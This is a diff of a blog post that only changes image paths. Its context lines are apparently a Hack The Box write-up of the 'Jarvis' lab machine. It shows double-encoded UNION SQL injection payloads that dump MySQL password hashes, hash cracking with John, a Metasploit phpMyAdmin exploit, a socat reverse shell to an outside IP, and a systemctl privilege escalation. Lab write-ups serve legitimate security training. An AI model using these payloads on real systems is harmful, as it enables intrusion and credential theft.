@@ -8,7 +8,7 @@ toc_sticky: true
 ---
 ## Recon:
 
-<img class="alignnone wp-image-122" src="/assets/uploads/2019/08/html_cover-300x216.png" alt="" width="731" height="526" srcset="/assets/uploads/2019/08/html_cover-300x216.png 300w, /assets/uploads/2019/08/html_cover-768x554.png 768w, /assets/uploads/2019/08/html_cover.png 797w" sizes="(max-width: 731px) 100vw, 731px" /> 
+<img class="alignnone wp-image-122" src="/Sidequests/assets/uploads/2019/08/html_cover-300x216.png" alt="" width="731" height="526" srcset="/Sidequests/assets/uploads/2019/08/html_cover-300x216.png 300w, /Sidequests/assets/uploads/2019/08/html_cover-768x554.png 768w, /Sidequests/assets/uploads/2019/08/html_cover.png 797w" sizes="(max-width: 731px) 100vw, 731px" /> 
 
 The website isn&#8217;t bare, but most of the links found don&#8217;t actually go anywhere. The only page with anything really going on is &#8216;Rooms&#8217;, where you&#8217;ll find the links to the rooms are PHP requests.
 
@@ -81,7 +81,7 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 
 I tried logging into the PHPMyAdmin with some low-hanging fruit credentials, but no luck there. However, it did give an error message that told my the database being used is MySQL.
 
-<img class="alignnone wp-image-141" src="/assets/uploads/2019/08/js_phpmyadmin_login-219x300.png" alt="" width="390" height="534" srcset="/assets/uploads/2019/08/js_phpmyadmin_login-219x300.png 219w, /assets/uploads/2019/08/js_phpmyadmin_login.png 437w" sizes="(max-width: 390px) 100vw, 390px" /> 
+<img class="alignnone wp-image-141" src="/Sidequests/assets/uploads/2019/08/js_phpmyadmin_login-219x300.png" alt="" width="390" height="534" srcset="/Sidequests/assets/uploads/2019/08/js_phpmyadmin_login-219x300.png 219w, /Sidequests/assets/uploads/2019/08/js_phpmyadmin_login.png 437w" sizes="(max-width: 390px) 100vw, 390px" /> 
 
 ### Investigating room.php
 
@@ -89,12 +89,12 @@ Looking into the source code from the site, I found only one lookup that was fun
 
 Trying a few common things with the input was fruitless. Then I tried to start smaller and see if it&#8217;ll accept an apostrophe. It doesn&#8217;t. Instead, it returns a broken page like so:
 
-<img class="alignnone wp-image-143 size-full" src="/assets/uploads/2019/08/js_room_broken-1.png" alt="" width="1098" height="836" srcset="/assets/uploads/2019/08/js_room_broken-1.png 1098w, /assets/uploads/2019/08/js_room_broken-1-300x228.png 300w, /assets/uploads/2019/08/js_room_broken-1-768x585.png 768w, /assets/uploads/2019/08/js_room_broken-1-1024x780.png 1024w" sizes="(max-width: 1098px) 100vw, 1098px" /> 
+<img class="alignnone wp-image-143 size-full" src="/Sidequests/assets/uploads/2019/08/js_room_broken-1.png" alt="" width="1098" height="836" srcset="/Sidequests/assets/uploads/2019/08/js_room_broken-1.png 1098w, /Sidequests/assets/uploads/2019/08/js_room_broken-1-300x228.png 300w, /Sidequests/assets/uploads/2019/08/js_room_broken-1-768x585.png 768w, /Sidequests/assets/uploads/2019/08/js_room_broken-1-1024x780.png 1024w" sizes="(max-width: 1098px) 100vw, 1098px" /> 
 
 Then I tried to encode the apostrophe as URL hex code %27 and that didn&#8217;t work either. But then I tried a double URL encoding of %2527 and bingo! There was a normal page view.  
 http://10.10.10.143/room.php?cod=3%2527
 
-<img class="alignnone wp-image-144 size-full" src="/assets/uploads/2019/08/js_room_normal.png" alt="" width="1099" height="836" srcset="/assets/uploads/2019/08/js_room_normal.png 1099w, /assets/uploads/2019/08/js_room_normal-300x228.png 300w, /assets/uploads/2019/08/js_room_normal-768x584.png 768w, /assets/uploads/2019/08/js_room_normal-1024x779.png 1024w" sizes="(max-width: 1099px) 100vw, 1099px" /> 
+<img class="alignnone wp-image-144 size-full" src="/Sidequests/assets/uploads/2019/08/js_room_normal.png" alt="" width="1099" height="836" srcset="/Sidequests/assets/uploads/2019/08/js_room_normal.png 1099w, /Sidequests/assets/uploads/2019/08/js_room_normal-300x228.png 300w, /Sidequests/assets/uploads/2019/08/js_room_normal-768x584.png 768w, /Sidequests/assets/uploads/2019/08/js_room_normal-1024x779.png 1024w" sizes="(max-width: 1099px) 100vw, 1099px" /> 
 
 ### SQL Injection
 
@@ -128,7 +128,7 @@ Sending a UNION statement with all columns numbered will show where each piece o
 
 `room.php?cod=99%2527 union select 1,2,3,4,5,6,7`
 
-<img class="alignnone wp-image-145 size-full" src="/assets/uploads/2019/08/j_sqli_labels.png" alt="" width="1099" height="899" srcset="/assets/uploads/2019/08/j_sqli_labels.png 1099w, /assets/uploads/2019/08/j_sqli_labels-300x245.png 300w, /assets/uploads/2019/08/j_sqli_labels-768x628.png 768w, /assets/uploads/2019/08/j_sqli_labels-1024x838.png 1024w" sizes="(max-width: 1099px) 100vw, 1099px" /> 
+<img class="alignnone wp-image-145 size-full" src="/Sidequests/assets/uploads/2019/08/j_sqli_labels.png" alt="" width="1099" height="899" srcset="/Sidequests/assets/uploads/2019/08/j_sqli_labels.png 1099w, /Sidequests/assets/uploads/2019/08/j_sqli_labels-300x245.png 300w, /Sidequests/assets/uploads/2019/08/j_sqli_labels-768x628.png 768w, /Sidequests/assets/uploads/2019/08/j_sqli_labels-1024x838.png 1024w" sizes="(max-width: 1099px) 100vw, 1099px" /> 
 
 Step 2 &#8211; Request some basic information about the database and it&#8217;s structure.
 
@@ -136,7 +136,7 @@ Step 2 &#8211; Request some basic information about the database and it&#8217;s 
 
 &nbsp;
 
-<img class="alignnone size-full wp-image-190" src="/assets/uploads/2019/08/js_sqli_basic.png" alt="" width="294" height="325" srcset="/assets/uploads/2019/08/js_sqli_basic.png 294w, /assets/uploads/2019/08/js_sqli_basic-271x300.png 271w" sizes="(max-width: 294px) 100vw, 294px" /> 
+<img class="alignnone size-full wp-image-190" src="/Sidequests/assets/uploads/2019/08/js_sqli_basic.png" alt="" width="294" height="325" srcset="/Sidequests/assets/uploads/2019/08/js_sqli_basic.png 294w, /Sidequests/assets/uploads/2019/08/js_sqli_basic-271x300.png 271w" sizes="(max-width: 294px) 100vw, 294px" /> 
 
 Step 3 &#8211; After getting the database name &#8216;hotel&#8217;, I extracted the table and column information.
 
@@ -144,19 +144,19 @@ The below statement retrieves the table name.
 
 `room.php?cod=99%2527 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.columns where table_schema like 'hotel'`
 
-<img class="alignnone size-full wp-image-150" src="/assets/uploads/2019/08/js_sqli_table.png" alt="" width="291" height="330" srcset="/assets/uploads/2019/08/js_sqli_table.png 291w, /assets/uploads/2019/08/js_sqli_table-265x300.png 265w" sizes="(max-width: 291px) 100vw, 291px" /> 
+<img class="alignnone size-full wp-image-150" src="/Sidequests/assets/uploads/2019/08/js_sqli_table.png" alt="" width="291" height="330" srcset="/Sidequests/assets/uploads/2019/08/js_sqli_table.png 291w, /Sidequests/assets/uploads/2019/08/js_sqli_table-265x300.png 265w" sizes="(max-width: 291px) 100vw, 291px" /> 
 
 After that, use a statement like below to extract the columns. Increment the LIMIT operator to get the data out one at a time.
 
 `room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 0,1`
 
 <p class="lang:zsh highlight:0 decode:true">
-  <img class="alignnone size-full wp-image-151" src="/assets/uploads/2019/08/js_sqli_column1.png" alt="" width="290" height="325" srcset="/assets/uploads/2019/08/js_sqli_column1.png 290w, /assets/uploads/2019/08/js_sqli_column1-268x300.png 268w" sizes="(max-width: 290px) 100vw, 290px" />
+  <img class="alignnone size-full wp-image-151" src="/Sidequests/assets/uploads/2019/08/js_sqli_column1.png" alt="" width="290" height="325" srcset="/Sidequests/assets/uploads/2019/08/js_sqli_column1.png 290w, /Sidequests/assets/uploads/2019/08/js_sqli_column1-268x300.png 268w" sizes="(max-width: 290px) 100vw, 290px" />
 </p>
 
 `room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 1,1`
 
-<img class="alignnone size-full wp-image-152" src="/assets/uploads/2019/08/js_sqli_column2.png" alt="" width="292" height="325" srcset="/assets/uploads/2019/08/js_sqli_column2.png 292w, /assets/uploads/2019/08/js_sqli_column2-270x300.png 270w" sizes="(max-width: 292px) 100vw, 292px" /> 
+<img class="alignnone size-full wp-image-152" src="/Sidequests/assets/uploads/2019/08/js_sqli_column2.png" alt="" width="292" height="325" srcset="/Sidequests/assets/uploads/2019/08/js_sqli_column2.png 292w, /Sidequests/assets/uploads/2019/08/js_sqli_column2-270x300.png 270w" sizes="(max-width: 292px) 100vw, 292px" /> 
 
 After going through all of the columns until the page breaks, I ended up with the following:
 
@@ -174,7 +174,7 @@ This is all good info, but it didn&#8217;t get me what I wanted, which was the &
 
 `room.php?cod=99%2527 UNION SELECT ALL 1,table_name,3,4,table_name,6,7 FROM information_schema.columns where column_name like 'user' limit 0, 1`
 
-<img class="alignnone size-full wp-image-154" src="/assets/uploads/2019/08/js_sqli_table2.png" alt="" width="300" height="324" srcset="/assets/uploads/2019/08/js_sqli_table2.png 300w, /assets/uploads/2019/08/js_sqli_table2-278x300.png 278w" sizes="(max-width: 300px) 100vw, 300px" /> 
+<img class="alignnone size-full wp-image-154" src="/Sidequests/assets/uploads/2019/08/js_sqli_table2.png" alt="" width="300" height="324" srcset="/Sidequests/assets/uploads/2019/08/js_sqli_table2.png 300w, /Sidequests/assets/uploads/2019/08/js_sqli_table2-278x300.png 278w" sizes="(max-width: 300px) 100vw, 300px" /> 
 
 Now that was getting me other tables, and ones with &#8216;user&#8217; fields! Incrementing the LIMIT operator resulted in quite a lot of tables.
 
@@ -264,7 +264,7 @@ The only one with a &#8216;password&#8217; column is the table &#8216;user&#8217
 
 &nbsp;
 
-<img class="alignnone size-full wp-image-156" src="/assets/uploads/2019/08/js_sqli_database2.png" alt="" width="295" height="321" srcset="/assets/uploads/2019/08/js_sqli_database2.png 295w, /assets/uploads/2019/08/js_sqli_database2-276x300.png 276w" sizes="(max-width: 295px) 100vw, 295px" /> 
+<img class="alignnone size-full wp-image-156" src="/Sidequests/assets/uploads/2019/08/js_sqli_database2.png" alt="" width="295" height="321" srcset="/Sidequests/assets/uploads/2019/08/js_sqli_database2.png 295w, /Sidequests/assets/uploads/2019/08/js_sqli_database2-276x300.png 276w" sizes="(max-width: 295px) 100vw, 295px" /> 
 
 It is &#8216;MySQL&#8217;. With that needed bit of info, a statement could be made to extract the credentials.
 
@@ -272,13 +272,13 @@ Step 4 &#8211; Extract the desired fields.
 
 `room.php?cod=99%2527 UNION SELECT ALL 1,Password,3,4,user,6,7 FROM mysql.user limit 0,1`
 
-<img class="alignnone size-full wp-image-157" src="/assets/uploads/2019/08/js_sqli_password.png" alt="" width="492" height="318" srcset="/assets/uploads/2019/08/js_sqli_password.png 492w, /assets/uploads/2019/08/js_sqli_password-300x194.png 300w" sizes="(max-width: 492px) 100vw, 492px" /> 
+<img class="alignnone size-full wp-image-157" src="/Sidequests/assets/uploads/2019/08/js_sqli_password.png" alt="" width="492" height="318" srcset="/Sidequests/assets/uploads/2019/08/js_sqli_password.png 492w, /Sidequests/assets/uploads/2019/08/js_sqli_password-300x194.png 300w" sizes="(max-width: 492px) 100vw, 492px" /> 
 
 ### Password Cracking
 
 To crack the password, I used John the Ripper. But John needs to know what type of hash it is, so I used a program &#8216;hash-identifier&#8217; to help with that.
 
-<img class="alignnone size-full wp-image-160" src="/assets/uploads/2019/08/js_pw_hashid.png" alt="" width="720" height="432" srcset="/assets/uploads/2019/08/js_pw_hashid.png 720w, /assets/uploads/2019/08/js_pw_hashid-300x180.png 300w" sizes="(max-width: 720px) 100vw, 720px" /> 
+<img class="alignnone size-full wp-image-160" src="/Sidequests/assets/uploads/2019/08/js_pw_hashid.png" alt="" width="720" height="432" srcset="/Sidequests/assets/uploads/2019/08/js_pw_hashid.png 720w, /Sidequests/assets/uploads/2019/08/js_pw_hashid-300x180.png 300w" sizes="(max-width: 720px) 100vw, 720px" /> 
 
 It shows a MySQL5 &#8211; SHA1 hash.
 
@@ -286,7 +286,7 @@ Putting this into John looks like this:
 
 `john &#8211;wordlist=/usr/share/wordlists/rockyou.txt &#8211;format:MySQL-sha1 hashes.txt`
 
-<img class="alignnone size-full wp-image-161" src="/assets/uploads/2019/08/js_pw_john.png" alt="" width="721" height="212" srcset="/assets/uploads/2019/08/js_pw_john.png 721w, /assets/uploads/2019/08/js_pw_john-300x88.png 300w" sizes="(max-width: 721px) 100vw, 721px" /> 
+<img class="alignnone size-full wp-image-161" src="/Sidequests/assets/uploads/2019/08/js_pw_john.png" alt="" width="721" height="212" srcset="/Sidequests/assets/uploads/2019/08/js_pw_john.png 721w, /Sidequests/assets/uploads/2019/08/js_pw_john-300x88.png 300w" sizes="(max-width: 721px) 100vw, 721px" /> 
 
 The password is **&#8216;imissyou&#8217;**
 
@@ -298,7 +298,7 @@ With credentials found, it was time to go back into the PHPMyAdmin page and see 
 
 Guess what&#8230; it did!
 
-<img class="alignnone wp-image-166 size-full" src="/assets/uploads/2019/08/js_panel_version.png" alt="" width="1099" height="899" srcset="/assets/uploads/2019/08/js_panel_version.png 1099w, /assets/uploads/2019/08/js_panel_version-300x245.png 300w, /assets/uploads/2019/08/js_panel_version-768x628.png 768w, /assets/uploads/2019/08/js_panel_version-1024x838.png 1024w" sizes="(max-width: 1099px) 100vw, 1099px" /> 
+<img class="alignnone wp-image-166 size-full" src="/Sidequests/assets/uploads/2019/08/js_panel_version.png" alt="" width="1099" height="899" srcset="/Sidequests/assets/uploads/2019/08/js_panel_version.png 1099w, /Sidequests/assets/uploads/2019/08/js_panel_version-300x245.png 300w, /Sidequests/assets/uploads/2019/08/js_panel_version-768x628.png 768w, /Sidequests/assets/uploads/2019/08/js_panel_version-1024x838.png 1024w" sizes="(max-width: 1099px) 100vw, 1099px" /> 
 
 This screenshot shows where to find the version info for PHPMyAdmin once it&#8217;s logged in.
 
@@ -310,23 +310,23 @@ Knowing the version, you can do a google search and find out there&#8217;s a doc
 
 Look in Metasploit and you&#8217;ll see an exploit module for the LFI vulnerability.
 
-<img class="alignnone size-full wp-image-168" src="/assets/uploads/2019/08/js_panel_metasploit.png" alt="" width="722" height="435" srcset="/assets/uploads/2019/08/js_panel_metasploit.png 722w, /assets/uploads/2019/08/js_panel_metasploit-300x181.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
+<img class="alignnone size-full wp-image-168" src="/Sidequests/assets/uploads/2019/08/js_panel_metasploit.png" alt="" width="722" height="435" srcset="/Sidequests/assets/uploads/2019/08/js_panel_metasploit.png 722w, /Sidequests/assets/uploads/2019/08/js_panel_metasploit-300x181.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
-<img class="alignnone size-full wp-image-169" src="/assets/uploads/2019/08/js_panel_metasploit_options.png" alt="" width="722" height="791" srcset="/assets/uploads/2019/08/js_panel_metasploit_options.png 722w, /assets/uploads/2019/08/js_panel_metasploit_options-274x300.png 274w" sizes="(max-width: 722px) 100vw, 722px" /> 
+<img class="alignnone size-full wp-image-169" src="/Sidequests/assets/uploads/2019/08/js_panel_metasploit_options.png" alt="" width="722" height="791" srcset="/Sidequests/assets/uploads/2019/08/js_panel_metasploit_options.png 722w, /Sidequests/assets/uploads/2019/08/js_panel_metasploit_options-274x300.png 274w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
 Once I had a meterpreter shell up, I uploaded &#8220;LinEnum.sh&#8221;.
 
-<img class="alignnone size-full wp-image-172" src="/assets/uploads/2019/08/js_panel_linenum_upload.png" alt="" width="722" height="176" srcset="/assets/uploads/2019/08/js_panel_linenum_upload.png 722w, /assets/uploads/2019/08/js_panel_linenum_upload-300x73.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
+<img class="alignnone size-full wp-image-172" src="/Sidequests/assets/uploads/2019/08/js_panel_linenum_upload.png" alt="" width="722" height="176" srcset="/Sidequests/assets/uploads/2019/08/js_panel_linenum_upload.png 722w, /Sidequests/assets/uploads/2019/08/js_panel_linenum_upload-300x73.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
 LinEnum is a script to get a lot of enumerated info about the system at once. When it&#8217;s run against this host, there&#8217;s one particular bit of information that looks really interesting.
 
-<img class="alignnone size-full wp-image-171" src="/assets/uploads/2019/08/js_panel_linenum.png" alt="" width="719" height="427" srcset="/assets/uploads/2019/08/js_panel_linenum.png 719w, /assets/uploads/2019/08/js_panel_linenum-300x178.png 300w" sizes="(max-width: 719px) 100vw, 719px" /> 
+<img class="alignnone size-full wp-image-171" src="/Sidequests/assets/uploads/2019/08/js_panel_linenum.png" alt="" width="719" height="427" srcset="/Sidequests/assets/uploads/2019/08/js_panel_linenum.png 719w, /Sidequests/assets/uploads/2019/08/js_panel_linenum-300x178.png 300w" sizes="(max-width: 719px) 100vw, 719px" /> 
 
 It&#8217;s useful later for a privilege escalation once we get into the user account ‘pepper’.
 
 The most probable way of getting a priv escalation to the user ‘pepper’ is through a script that can be run with sudo:
 
-<img class="alignnone wp-image-173" src="/assets/uploads/2019/08/js_panel_linenum_sudo.png" alt="" width="718" height="148" srcset="/assets/uploads/2019/08/js_panel_linenum_sudo.png 722w, /assets/uploads/2019/08/js_panel_linenum_sudo-300x62.png 300w" sizes="(max-width: 718px) 100vw, 718px" /> 
+<img class="alignnone wp-image-173" src="/Sidequests/assets/uploads/2019/08/js_panel_linenum_sudo.png" alt="" width="718" height="148" srcset="/Sidequests/assets/uploads/2019/08/js_panel_linenum_sudo.png 722w, /Sidequests/assets/uploads/2019/08/js_panel_linenum_sudo-300x62.png 300w" sizes="(max-width: 718px) 100vw, 718px" /> 
 
 ### User Escalation
 
@@ -334,13 +334,13 @@ The most probable way of getting a priv escalation to the user ‘pepper’ is t
 
 The script can be run as sudo by &#8216;www-data&#8217;!
 
-<img class="alignnone size-full wp-image-180" src="/assets/uploads/2019/08/js_simpler_output.png" alt="" width="722" height="454" srcset="/assets/uploads/2019/08/js_simpler_output.png 722w, /assets/uploads/2019/08/js_simpler_output-300x189.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
+<img class="alignnone size-full wp-image-180" src="/Sidequests/assets/uploads/2019/08/js_simpler_output.png" alt="" width="722" height="454" srcset="/Sidequests/assets/uploads/2019/08/js_simpler_output.png 722w, /Sidequests/assets/uploads/2019/08/js_simpler_output-300x189.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
 Wasn&#8217;t sure what to do with it, so I used &#8216;cat&#8217; on it and copied the output to Notepad++ for studying.
 
 I found one probable attack point in the code:
 
-<img class="alignnone size-full wp-image-175" src="/assets/uploads/2019/08/js_simpler_code.png" alt="" width="1001" height="599" srcset="/assets/uploads/2019/08/js_simpler_code.png 1001w, /assets/uploads/2019/08/js_simpler_code-300x180.png 300w, /assets/uploads/2019/08/js_simpler_code-768x460.png 768w" sizes="(max-width: 1001px) 100vw, 1001px" /> 
+<img class="alignnone size-full wp-image-175" src="/Sidequests/assets/uploads/2019/08/js_simpler_code.png" alt="" width="1001" height="599" srcset="/Sidequests/assets/uploads/2019/08/js_simpler_code.png 1001w, /Sidequests/assets/uploads/2019/08/js_simpler_code-300x180.png 300w, /Sidequests/assets/uploads/2019/08/js_simpler_code-768x460.png 768w" sizes="(max-width: 1001px) 100vw, 1001px" /> 
 
 Looks like command substitution can be exploited here since the shell execution characters &#8220;$()&#8221; aren&#8217;t filtered!
 
@@ -368,7 +368,7 @@ This allowed me to bypass the filtered characters since I need some of them. Thi
 
 Then set up a socat connection with `socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:10.10.15.29:5555`
 
-<img class="alignnone size-full wp-image-182" src="/assets/uploads/2019/08/js_simpler_socat.png" alt="" width="720" height="108" srcset="/assets/uploads/2019/08/js_simpler_socat.png 720w, /assets/uploads/2019/08/js_simpler_socat-300x45.png 300w" sizes="(max-width: 720px) 100vw, 720px" /> 
+<img class="alignnone size-full wp-image-182" src="/Sidequests/assets/uploads/2019/08/js_simpler_socat.png" alt="" width="720" height="108" srcset="/Sidequests/assets/uploads/2019/08/js_simpler_socat.png 720w, /Sidequests/assets/uploads/2019/08/js_simpler_socat-300x45.png 300w" sizes="(max-width: 720px) 100vw, 720px" /> 
 
 ### Root Escalation
 
@@ -376,7 +376,7 @@ Tried to use the &#8216;systemctl&#8217; command for the next escalation. My fir
 
 But I got an error that the shell isn&#8217;t good enough:
 
-<img class="alignnone size-full wp-image-184" src="/assets/uploads/2019/08/js_systemctl_status.png" alt="" width="723" height="55" srcset="/assets/uploads/2019/08/js_systemctl_status.png 723w, /assets/uploads/2019/08/js_systemctl_status-300x23.png 300w" sizes="(max-width: 723px) 100vw, 723px" /> 
+<img class="alignnone size-full wp-image-184" src="/Sidequests/assets/uploads/2019/08/js_systemctl_status.png" alt="" width="723" height="55" srcset="/Sidequests/assets/uploads/2019/08/js_systemctl_status.png 723w, /Sidequests/assets/uploads/2019/08/js_systemctl_status-300x23.png 300w" sizes="(max-width: 723px) 100vw, 723px" /> 
 
 &#8230; and when I broke out of &#8216;less&#8217;, it didn&#8217;t give root permissions as I had hoped.
 
@@ -384,11 +384,11 @@ I did some research on what &#8216;systemctl&#8217; is used for and figured I co
 
 Here&#8217;s a very simple service setup that I used:
 
-<img class="alignnone size-full wp-image-185" src="/assets/uploads/2019/08/js_systemctl_service.png" alt="" width="723" height="434" srcset="/assets/uploads/2019/08/js_systemctl_service.png 723w, /assets/uploads/2019/08/js_systemctl_service-300x180.png 300w" sizes="(max-width: 723px) 100vw, 723px" /> 
+<img class="alignnone size-full wp-image-185" src="/Sidequests/assets/uploads/2019/08/js_systemctl_service.png" alt="" width="723" height="434" srcset="/Sidequests/assets/uploads/2019/08/js_systemctl_service.png 723w, /Sidequests/assets/uploads/2019/08/js_systemctl_service-300x180.png 300w" sizes="(max-width: 723px) 100vw, 723px" /> 
 
 And my script that is referenced in the service:
 
-<img class="alignnone size-full wp-image-186" src="/assets/uploads/2019/08/js_systemctl_service_script.png" alt="" width="720" height="431" srcset="/assets/uploads/2019/08/js_systemctl_service_script.png 720w, /assets/uploads/2019/08/js_systemctl_service_script-300x180.png 300w" sizes="(max-width: 720px) 100vw, 720px" /> 
+<img class="alignnone size-full wp-image-186" src="/Sidequests/assets/uploads/2019/08/js_systemctl_service_script.png" alt="" width="720" height="431" srcset="/Sidequests/assets/uploads/2019/08/js_systemctl_service_script.png 720w, /Sidequests/assets/uploads/2019/08/js_systemctl_service_script-300x180.png 300w" sizes="(max-width: 720px) 100vw, 720px" /> 
 
 Afterward, I realized it would have been more efficient to put the script command directly in the service setup, but whatever, it works this way too.
 
@@ -400,8 +400,8 @@ Then I moved the files to pepper&#8217;s home directory and it worked beautifull
 
 See the following screenshot for the command to get the service to work:
 
-<img class="alignnone size-full wp-image-187" src="/assets/uploads/2019/08/js_systemctl_service_run.png" alt="" width="719" height="358" srcset="/assets/uploads/2019/08/js_systemctl_service_run.png 719w, /assets/uploads/2019/08/js_systemctl_service_run-300x149.png 300w" sizes="(max-width: 719px) 100vw, 719px" /> 
+<img class="alignnone size-full wp-image-187" src="/Sidequests/assets/uploads/2019/08/js_systemctl_service_run.png" alt="" width="719" height="358" srcset="/Sidequests/assets/uploads/2019/08/js_systemctl_service_run.png 719w, /Sidequests/assets/uploads/2019/08/js_systemctl_service_run-300x149.png 300w" sizes="(max-width: 719px) 100vw, 719px" /> 
 
 And proof on my box:
 
-<img class="alignnone size-full wp-image-188" src="/assets/uploads/2019/08/js_root_proof.png" alt="" width="721" height="145" srcset="/assets/uploads/2019/08/js_root_proof.png 721w, /assets/uploads/2019/08/js_root_proof-300x60.png 300w" sizes="(max-width: 721px) 100vw, 721px" />
+<img class="alignnone size-full wp-image-188" src="/Sidequests/assets/uploads/2019/08/js_root_proof.png" alt="" width="721" height="145" srcset="/Sidequests/assets/uploads/2019/08/js_root_proof.png 721w, /Sidequests/assets/uploads/2019/08/js_root_proof-300x60.png 300w" sizes="(max-width: 721px) 100vw, 721px" />
